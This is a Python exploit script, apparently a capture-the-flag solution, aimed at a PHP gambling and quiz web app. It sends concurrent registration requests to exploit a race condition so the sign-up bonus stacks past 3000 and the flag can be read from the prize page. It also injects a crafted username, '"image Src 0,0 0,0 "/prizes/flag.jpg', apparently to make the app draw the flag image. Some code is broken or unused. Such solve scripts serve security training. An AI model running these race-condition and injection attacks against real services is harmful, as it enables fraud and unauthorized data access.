#!/usr/bin/env python3

import asyncio
import itertools
import logging
import os
import random
import re
import string
from http.cookiejar import CookieJar
from multiprocessing import Pool
import requests

import httpx

logging.disable()

URL = os.environ.get("URL", "http://localhost:8000")
if URL.endswith("/"):
    URL = URL[:-1]

class NullCookieJar(CookieJar):
    def extract_cookies(self, *_):
        pass

    def set_cookie(self, _):
        pass


async def get_session(client: httpx.AsyncClient, email: str, password: str) -> str:
    resp = await client.post(f'{URL}/login.php', data={'email': email, 'password': password}, cookies={})
    resp.raise_for_status()

    assert "<meta http-equiv='refresh' content='0;url=/gambling.php'>" in resp.text

    return resp.cookies["PHPSESSID"]


async def submit_quiz(client: httpx.AsyncClient, session: str, answer: str) -> tuple[bool, bool, int]:
    resp = await client.post(f'{URL}/quiz.php', data={'answer': answer}, cookies={'PHPSESSID': session})
    resp.raise_for_status()

    if 'you need at least 15 points to get the prize :(' in resp.text:
        return True, False, 0

    match = re.findall('Question (\\d+)', resp.text)
    assert len(match) == 1

    return False, 'Correct' in resp.text, int(match[0])

async def submit_user_info(client: httpx.AsyncClient) -> list[str]:
    email = ''.join(random.choices(string.ascii_letters, k=16))
    print("email2: "+email)
    resp = await client.post(f'{URL}/login.php',
                                 data={'username': '"image Src 0,0 0,0 "/prizes/flag.jpg', 'email': email})
    resp.raise_for_status()

    match = re.findall(r'Your password is "(.+?)"', resp.text)
    print("password1: "+ match)
    return [email,match]

async def submit_login(client: httpx.AsyncClient, email: str,password: str) -> str:
    resp = await client.post(f'{URL}/login.php',
                             data={'username': '"image Src 0,0 0,0 "/prizes/flag.jpg',
                                   'email': email,'password': password})
    resp.raise_for_status()
    return 1
    
    
    
    
async def get_balance(client: httpx.AsyncClient, session: str) -> int:
    resp = await client.get(f'{URL}/gambling.php', cookies={'PHPSESSID': session})
    resp.raise_for_status()
    match = re.findall(r'Balance:\s*(\d+)', resp.text)
    assert len(match) == 1
    return int(match[0])

async def get_flag(client: httpx.AsyncClient, session: str) -> int:
    resp = await client.get(f'{URL}/prize.php', cookies={'PHPSESSID': session})
    resp.raise_for_status()
    
    
    match = re.findall(r'(Flag:\s*[A-Za-z0-9()_]+)', resp.text)
    word = match[0].split(" ")[1]
    assert len(match) == 1
    return word


async def run(sess_count: int):

    
    async with httpx.AsyncClient(follow_redirects=False, cookies=NullCookieJar()) as client:
         
        while True:
            
            email = ''.join(random.choices(string.ascii_letters, k=16))
            password = ''.join(random.choices(string.ascii_letters, k=16))
            
            print("email2: "+email)
            print("password2: "+password)

            tasks = []
            for sess in range(sess_count):
                    tasks.append(asyncio.ensure_future(submit_login(client, email, password)))
            
            results = await asyncio.gather(*tasks)
            session = await get_session(client, email,password)
            balance = await get_balance(client, session)
            print(" You got: "+str(balance)+" as sign up bonus")
            if (balance >= 3000):
                y = await get_flag(client, session)
                print("FLAG IS: -----    " + y + "    -----")
                return
            await asyncio.sleep(1)  
            
        
        

async def main():
    
    c = 10
    try:
        await run(c)
        return
    except Exception as e:
        print('Retrying:', e)


if __name__ == '__main__':
    asyncio.run(main())



